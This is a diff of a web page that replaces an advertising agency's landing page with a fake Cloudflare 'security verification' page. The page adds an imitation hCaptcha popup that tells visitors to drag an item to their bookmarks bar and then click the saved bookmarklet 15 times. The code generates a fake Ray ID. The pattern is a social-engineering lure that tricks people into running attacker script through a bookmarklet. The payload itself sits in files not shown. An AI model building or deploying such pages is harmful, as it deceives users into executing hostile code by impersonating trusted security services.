@@ -1,134 +1,525 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>tier – Facebook & Instagram Advertising</title>
-  <link rel="stylesheet" href="style.css">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Just a moment...</title>
+  <meta name="captcha-base-url" content="" id="captcha-base-url">
   <style>
-    .landing {
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      background-color: #0a0a0a;
+      color: #ffffff;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
       min-height: 100vh;
-      background: #2563eb;
       display: flex;
       flex-direction: column;
-      padding: 24px 32px;
-    }
-    .landing-header {
-      display: flex;
       align-items: center;
-      justify-content: space-between;
-      max-width: 1200px;
-      margin: 0 auto;
+      justify-content: center;
+    }
+
+    .container {
       width: 100%;
-    }
-    .landing-logo {
-      display: flex;
-      align-items: center;
-      gap: 6px;
-      color: #fff;
-      font-size: 22px;
-      font-weight: 600;
-      text-decoration: none;
-      letter-spacing: -0.02em;
-    }
-    .landing-logo-arrow {
-      width: 12px;
-      height: 12px;
-      background: #22c55e;
-      clip-path: polygon(50% 0%, 100% 100%, 0% 100%);
-    }
-    .landing-nav {
-      display: flex;
-      align-items: center;
-      gap: 28px;
-    }
-    .landing-nav a {
-      color: #fff;
-      text-decoration: none;
-      font-size: 14px;
-      font-weight: 500;
-      letter-spacing: 0.02em;
-    }
-    .landing-nav a:hover {
-      opacity: 0.9;
-    }
-    .landing-nav-dropdown {
-      display: inline-flex;
-      align-items: center;
-      gap: 4px;
-    }
-    .landing-nav-dropdown svg {
-      width: 12px;
-      height: 12px;
-      opacity: 0.9;
-    }
-    .landing-hero {
+      max-width: 860px;
+      padding: 0 40px;
       flex: 1;
       display: flex;
       flex-direction: column;
-      align-items: flex-start;
       justify-content: center;
-      max-width: 1200px;
-      margin: 0 auto;
-      width: 100%;
-      padding: 48px 0;
     }
-    .landing-headline {
-      font-size: clamp(2rem, 5vw, 3.25rem);
-      font-weight: 700;
-      color: #fff;
-      line-height: 1.2;
-      margin: 0 0 16px;
-      max-width: 720px;
-      letter-spacing: -0.02em;
+
+    .header {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      margin-bottom: 32px;
     }
-    .landing-tagline {
-      font-size: 18px;
-      color: rgba(255, 255, 255, 0.95);
-      margin: 0 0 40px;
-      font-weight: 400;
+
+    .robot-emoji {
+      font-size: 42px;
+      line-height: 1;
     }
-    .landing-cta {
-      display: inline-block;
-      padding: 16px 40px;
-      background: #ec4899;
-      color: #fff;
-      font-size: 16px;
+
+    .site-name {
+      font-size: 40px;
       font-weight: 600;
+      color: #ffffff;
+      letter-spacing: -0.5px;
+    }
+
+    .title {
+      font-size: 18px;
+      font-weight: 700;
+      color: #ffffff;
+      margin-bottom: 14px;
+    }
+
+    .description {
+      font-size: 14px;
+      color: #aaaaaa;
+      line-height: 1.7;
+      max-width: 760px;
+      margin-bottom: 36px;
+    }
+
+    .captcha-box {
+      width: 300px;
+      border: 1px solid #555;
+      border-radius: 4px;
+      background: #1a1a1a;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 18px 20px;
+      cursor: pointer;
+      transition: border-color 0.2s;
+    }
+
+    .captcha-box:hover {
+      border-color: #888;
+    }
+
+    .captcha-left {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    /* Hidden real checkbox, custom visible one */
+    .real-checkbox {
+      position: absolute;
+      opacity: 0;
+      width: 0;
+      height: 0;
+      pointer-events: none;
+    }
+
+    .checkbox {
+      width: 22px;
+      height: 22px;
+      border: 2px solid #aaa;
+      border-radius: 3px;
+      background: transparent;
+      flex-shrink: 0;
+      position: relative;
+      transition: border-color 0.2s, background 0.2s;
+    }
+
+    .checkbox.checked {
+      background: #22c55e;
+      border-color: #22c55e;
+    }
+
+    .checkbox.checked::after {
+      content: "";
+      position: absolute;
+      left: 5px;
+      top: 2px;
+      width: 5px;
+      height: 10px;
+      border: solid #fff;
+      border-width: 0 2px 2px 0;
+      transform: rotate(45deg);
+    }
+
+    .verify-text {
+      font-size: 14px;
+      color: #ffffff;
+    }
+
+    .cloudflare-brand {
+      display: flex;
+      flex-direction: column;
+      align-items: flex-end;
+      gap: 2px;
+    }
+
+    .cloudflare-logo {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+
+    .cf-cloud {
+      width: 30px;
+      height: 18px;
+    }
+
+    .cf-text {
+      font-size: 11px;
+      font-weight: 700;
+      color: #ffffff;
+      letter-spacing: 0.5px;
+      text-transform: uppercase;
+    }
+
+    .cf-links {
+      display: flex;
+      gap: 6px;
+      font-size: 10px;
+    }
+
+    .cf-links a {
+      color: #f6821f;
       text-decoration: none;
-      border-radius: 9999px;
+    }
+
+    .cf-links a:hover {
+      text-decoration: underline;
+    }
+
+    .footer {
+      width: 100%;
+      border-top: 1px solid #2a2a2a;
+      padding: 16px 40px;
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      align-items: center;
+      font-size: 12px;
+      color: #888;
+    }
+
+    .footer a {
+      color: #4a9eff;
+      text-decoration: none;
+    }
+
+    .footer a:hover {
+      text-decoration: underline;
+    }
+
+    .ray-id { color: #888; }
+
+    /* ── hCaptcha-style challenge popup ── */
+    .captcha-popup-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.55);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+      padding: 24px;
+    }
+    .captcha-popup-overlay.hidden { display: none !important; }
+
+    .challenge-popup {
+      background: #fff;
+      border-radius: 6px;
+      width: 100%;
+      max-width: 460px;
+      overflow: hidden;
+      box-shadow: 0 4px 24px rgba(0,0,0,0.35);
+    }
+
+    .captcha-box-inner { padding: 0; }
+
+    /* Stage visibility */
+    .challenge-stage { display: block; }
+    .challenge-stage.hidden { display: none !important; }
+
+    /* Teal header – tall, big left-aligned text */
+    .challenge-banner {
+      background: #0d8a82;
+      color: #fff;
+      padding: 22px 24px 28px;
+      font-size: 20px;
+      font-weight: 500;
+      text-align: left;
+      line-height: 1.3;
+      min-height: 90px;
+      display: flex;
+      align-items: flex-start;
+    }
+
+    /* Image grid area */
+    .challenge-grid-wrap {
+      background: #ebebeb;
+      padding: 10px;
+    }
+
+    .challenge-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 4px;
+      background: #ebebeb;
+    }
+
+    .challenge-tile {
+      aspect-ratio: 1;
+      background: #f0f0f0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 48px;
+      user-select: none;
+      cursor: default;
+      position: relative;
+      transition: outline 0.15s;
+    }
+
+    .challenge-tile:hover { background: #e8e8e8; }
+
+    .challenge-tile.draggable {
+      cursor: grab;
+      outline: 4px solid #0d8a82;
+      outline-offset: -4px;
+      background: #fff;
+    }
+    .challenge-tile.draggable:active { cursor: grabbing; }
+
+    .challenge-tile a {
+      text-decoration: none;
+      color: inherit;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
+      height: 100%;
+      font-size: inherit;
+    }
+
+    /* Stage 2: click counter */
+    .challenge-stage2-body {
+      background: #ebebeb;
+      padding: 48px 24px;
+      text-align: center;
+      min-height: 240px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+    }
+    .click-counter-line {
+      font-size: 16px;
+      color: #333;
+    }
+    .click-counter-line strong {
+      display: block;
+      font-size: 56px;
+      font-weight: 700;
+      color: #0d8a82;
+      line-height: 1;
+      margin-bottom: 6px;
+    }
+    .click-counter-sub {
+      font-size: 13px;
+      color: #666;
+    }
+
+    /* hCaptcha-style footer bar */
+    .hcap-footer {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 10px 14px;
+      border-top: 1px solid #e0e0e0;
+      background: #fff;
+    }
+    .hcap-footer-left {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
+    .hcap-footer-lang {
+      font-size: 12px;
+      font-weight: 600;
+      color: #444;
+    }
+    .hcap-footer-dots {
+      display: flex;
+      gap: 5px;
+    }
+    .hcap-dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      background: #333;
+    }
+    .hcap-dot.inactive {
+      background: #ccc;
+    }
+    .hcap-footer-actions {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .hcap-icon-btn {
+      background: none;
       border: none;
       cursor: pointer;
-      transition: background 0.2s, transform 0.1s;
-      letter-spacing: 0.02em;
+      padding: 4px;
+      color: #555;
+      font-size: 16px;
+      line-height: 1;
+      display: flex;
+      align-items: center;
     }
-    .landing-cta:hover {
-      background: #db2777;
-      transform: translateY(-1px);
+    .hcap-logo {
+      width: 30px;
+      height: 30px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #29c3c1, #1a73e8);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 14px;
     }
-    .landing-cta:active {
-      transform: translateY(0);
+    .hcap-skip-btn {
+      background: #fff;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      padding: 8px 20px;
+      font-size: 14px;
+      font-weight: 600;
+      color: #333;
+      cursor: pointer;
+      transition: background 0.15s;
     }
+    .hcap-skip-btn:hover { background: #f5f5f5; }
+    .hcap-skip-btn.done-btn {
+      background: #0d8a82;
+      color: #fff;
+      border-color: #0d8a82;
+    }
+    .hcap-skip-btn.done-btn:hover { background: #0b7570; }
+
+    .hidden { display: none !important; }
   </style>
 </head>
-<body class="landing-page">
-  <div class="landing">
-    <header class="landing-header">
-      <a href="index.html" class="landing-logo">
-        tier
-        <span class="landing-logo-arrow" aria-hidden="true"></span>
-      </a>
-      <nav class="landing-nav">
-        <a href="#" class="landing-nav-dropdown">WHAT WE DO <svg viewBox="0 0 24 24" fill="currentColor"><path d="M7 10l5 5 5-5z"/></svg></a>
-        <a href="#">BLOG</a>
-      </nav>
-    </header>
+<body>
 
-    <section class="landing-hero">
-      <h1 class="landing-headline">Unlock Your Business Potential With Facebook & Instagram Advertising</h1>
-      <p class="landing-tagline">Facebook Premier Level Partner Agency</p>
-      <a href="captcha.html" class="landing-cta">WORK WITH US</a>
-    </section>
+  <div class="container">
+    <div class="header">
+      <span class="robot-emoji">🤖</span>
+      <span class="site-name">backstage.io</span>
+    </div>
+
+    <div class="title">Performing security verification</div>
+    <p class="description">
+      This website uses a security service to protect against malicious bots. This page is displayed while the website verifies you are not a bot.
+    </p>
+
+    <!-- The widget -->
+    <div class="captcha-box" id="captcha-widget" role="button" tabindex="0" aria-label="Verify you are human">
+      <div class="captcha-left">
+        <input type="checkbox" id="robotCheckbox" class="real-checkbox">
+        <div class="checkbox" id="visibleCheckbox"></div>
+        <span class="verify-text">Verify you are human</span>
+      </div>
+      <div class="cloudflare-brand">
+        <div class="cloudflare-logo">
+          <svg class="cf-cloud" viewBox="0 0 109 44" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M73.2 32.4c.3-1 .2-2-.4-2.8-.5-.7-1.4-1.2-2.3-1.3l-35.5-.5c-.2 0-.4-.1-.5-.3-.1-.2-.1-.4 0-.6.2-.3.5-.5.9-.5l35.8-.5c4.2-.2 8.8-3.6 10.4-7.7l2-5.3c.1-.2.1-.4 0-.6C81.2 5.8 73.7 0 65 0 57.8 0 51.6 4 48.4 9.9c-1.7-1.3-3.9-2-6.2-1.8-4.2.4-7.5 3.8-7.8 8-.1.8 0 1.5.1 2.3C28.4 18.7 24 23.4 24 29c0 .4 0 .8.1 1.2.1.2.3.4.5.4l48 .7h.1c.4 0 .7-.2.9-.5l.1-.4z" fill="#F6821F"/>
+            <path d="M84.4 18.3c-.4 0-.7 0-1.1.1-.2 0-.4.2-.5.4l-1.5 5.3c-.3 1-.2 2 .4 2.8.5.7 1.4 1.2 2.3 1.3l7.5.5c.2 0 .4.1.5.3.1.2.1.4 0 .6-.2.3-.5.5-.9.5l-7.7.5c-4.3.2-8.8 3.6-10.4 7.7H106c.2 0 .5-.2.5-.4.4-1.6.6-3.3.6-5C107.1 25.3 96.5 18.3 84.4 18.3z" fill="#FBAD41"/>
+          </svg>
+          <span class="cf-text">CLOUDFLARE</span>
+        </div>
+        <div class="cf-links">
+          <a href="#" onclick="return false;">Privacy</a>
+          <span>•</span>
+          <a href="#" onclick="return false;">Help</a>
+        </div>
+      </div>
+    </div>
   </div>
+
+  <div class="footer">
+    <span class="ray-id">Ray ID: <span id="cf-ray-id"></span></span>
+    <span>|</span>
+    <span>Performance and Security by <a href="https://www.cloudflare.com" target="_blank">Cloudflare</a></span>
+    <span>|</span>
+    <a href="#" onclick="return false;">Privacy</a>
+  </div>
+
+  <!-- hCaptcha-style challenge popup -->
+  <div class="captcha-popup-overlay hidden" id="challenge-popup-overlay">
+    <div class="challenge-popup">
+      <div class="captcha-box-inner hidden" id="captcha-box">
+
+        <!-- Challenge 1/2: drag to bookmark -->
+        <div class="challenge-stage" id="challenge1">
+          <div class="challenge-banner" id="challenge1Banner">Drag the item you can't eat to your bookmarks bar</div>
+          <div class="challenge-grid-wrap">
+            <div class="challenge-grid" id="challenge1Grid"></div>
+          </div>
+          <div class="hcap-footer">
+            <div class="hcap-footer-left">
+              <span class="hcap-footer-lang">EN</span>
+              <div class="hcap-footer-dots">
+                <span class="hcap-dot"></span>
+                <span class="hcap-dot inactive"></span>
+              </div>
+            </div>
+            <div class="hcap-footer-actions">
+              <button class="hcap-icon-btn" title="More options" onclick="return false;">⋮</button>
+              <button class="hcap-icon-btn" title="Refresh" onclick="return false;">↻</button>
+              <div class="hcap-logo">🤖</div>
+              <button type="button" class="hcap-skip-btn done-btn" id="done1Button">Next</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Challenge 2/2: click 15 times -->
+        <div class="challenge-stage hidden" id="challenge2">
+          <div class="challenge-banner">Click the bookmarked answer 15 times to verify</div>
+          <div class="challenge-stage2-body">
+            <p class="click-counter-line">
+              <strong id="clickCounter">0</strong>
+              <span>/ 15 clicks</span>
+            </p>
+            <p class="click-counter-sub">Use the bookmarklet you just saved in your bookmarks bar</p>
+          </div>
+          <div class="hcap-footer">
+            <div class="hcap-footer-left">
+              <span class="hcap-footer-lang">EN</span>
+              <div class="hcap-footer-dots">
+                <span class="hcap-dot"></span>
+                <span class="hcap-dot"></span>
+              </div>
+            </div>
+            <div class="hcap-footer-actions">
+              <button class="hcap-icon-btn" title="More options" onclick="return false;">⋮</button>
+              <button class="hcap-icon-btn" title="Refresh" onclick="return false;">↻</button>
+              <div class="hcap-logo">🤖</div>
+              <button type="button" class="hcap-skip-btn done-btn" id="done2Button">Submit</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Legacy hidden elements (used by script.js) -->
+        <div class="hidden" id="calculationDisplay"><p id="currentCalc"></p><p id="clickCount"></p></div>
+        <div class="hidden" id="captcha-container"></div>
+        <div class="hidden" id="timer"><span id="timer-value">20</span></div>
+        <div class="hidden" id="answerValue"></div>
+        <div class="hidden" id="stage1-buttons"></div>
+        <div class="hidden" id="stage2"></div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Fake Ray ID
+    var hex = Math.random().toString(16).slice(2,18);
+    document.getElementById("cf-ray-id").textContent = hex + "-SIN";
+
+    // Clicking the widget checks the box and opens challenge
+    var widget = document.getElementById("captcha-widget");
+    var visibleCb = document.getElementById("visibleCheckbox");
+    var realCb = document.getElementById("robotCheckbox");
+
+    widget.addEventListener("click", function (e) {
+      if (e.target.tagName === "A") return;
+      if (!realCb.checked) {
+        realCb.checked = true;
+        visibleCb.classList.add("checked");
+        realCb.dispatchEvent(new Event("change"));
+      }
+    });
+  </script>
+  <script src="script.js"></script>
 </body>
 </html>
